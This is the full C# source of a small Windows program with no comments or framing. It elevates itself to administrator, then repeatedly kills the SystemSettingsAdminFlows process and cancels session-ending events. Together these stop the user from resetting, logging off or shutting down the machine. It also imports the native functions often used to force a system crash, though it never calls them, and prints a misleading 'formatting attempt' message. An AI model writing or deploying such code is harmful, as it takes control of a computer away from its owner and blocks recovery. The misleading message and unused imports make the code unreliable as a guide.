using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Security.Principal;
using Microsoft.Win32;

class Program
{
    [DllImport("ntdll.dll")]
    public static extern int RtlAdjustPrivilege(int Privilege, bool bEnablePrivilege, bool IsThreadPrivilege, out bool PreviousValue);

    [DllImport("ntdll.dll")]
    public static extern int NtRaiseHardError(int ErrorStatus, int NumberOfParameters, int UnicodeStringParameterMask, IntPtr Parameters, int ValidResponseOption, out int Response);

    static void Main(string[] args)
    {
        if (!IsAdministrator())
        {
            RunElevated();
            return;
        }

        SystemEvents.SessionEnding += SystemEvents_SessionEnding;

        try
        {
            while (true)
            {
                Process[] processes = Process.GetProcessesByName("SystemSettingsAdminFlows");
                foreach (Process process in processes)
                {
                    process.Kill();
                    Console.WriteLine("SystemSettingsAdminFlows.exe process found and killed.");
                }

                System.Threading.Thread.Sleep(5000);
            }
        }
        catch (Exception ex)
        {
            Console.WriteLine("An error occurred: " + ex.Message);
        }
    }

    static void SystemEvents_SessionEnding(object sender, SessionEndingEventArgs e)
    {
        Console.WriteLine("Formatting attempt detected. Operation cancelled.");
        e.Cancel = true;
    }

    static bool IsAdministrator()
    {
        WindowsIdentity identity = WindowsIdentity.GetCurrent();
        WindowsPrincipal principal = new WindowsPrincipal(identity);
        return principal.IsInRole(WindowsBuiltInRole.Administrator);
    }

    static void RunElevated()
    {
        ProcessStartInfo startInfo = new ProcessStartInfo();
        startInfo.FileName = Process.GetCurrentProcess().MainModule.FileName;
        startInfo.Verb = "runas";
        try
        {
            Process.Start(startInfo);
        }
        catch (Exception ex)
        {
            Console.WriteLine("Error: Failed to start the program with elevated privileges.");
            Console.WriteLine(ex.Message);
        }
    }
}
